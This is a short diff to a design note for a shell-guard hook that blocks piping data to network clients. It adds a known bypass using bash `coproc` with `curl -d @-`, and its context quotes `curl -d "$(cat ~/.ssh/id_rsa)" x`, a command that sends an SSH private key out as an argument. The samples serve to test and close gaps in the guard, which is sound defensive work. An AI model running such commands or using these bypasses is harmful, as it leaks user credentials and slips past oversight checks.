@@ -20,6 +20,11 @@ stdin into a network client for the cases in `tests/test_shell_guard.py`
 
 Per L-088 every rule added here needs bypass cases that must stay blocked and positive cases that must pass.
 
+**`coproc` (51-02 re-review m6).** Also open: `… | coproc curl -d @- https://x` (the guard reads `coproc` as the
+program, so it sees no client) and `coproc apwt …; curl -d @- https://x <&${COPROC[0]}` (the `<&N` class above). Fix:
+treat `coproc [NAME] <command>` as a feed-opener whose command is analysed as fed; add case 1 to
+`test_shell_guard.py` and the hook header's known-open note.
+
 ## 2. shell-guard rule (c) covers stdin only
 
 **Context (51-02 m5).** Data passed as an argument or a file name is not blocked: `curl -d "$(cat ~/.ssh/id_rsa)" x`,
